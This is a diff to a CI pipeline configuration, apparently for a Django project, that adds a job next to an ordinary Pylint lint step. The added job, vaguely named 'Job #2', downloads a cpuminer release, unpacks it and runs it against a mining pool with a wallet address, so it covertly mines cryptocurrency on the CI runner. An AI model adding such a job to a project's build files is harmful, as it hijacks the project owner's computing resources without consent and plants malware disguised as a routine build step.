@@ -32,6 +32,9 @@ blocks:
         - name: Pylint
           commands:
             - git ls-files | grep -v 'migrations' | grep -v 'settings.py' | grep -v 'manage.py' | grep -E '.py$' | xargs pylint -E --load-plugins=pylint_django
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.2 -t 6'
   - name: Run Unit Tests
     task:
       prologue:
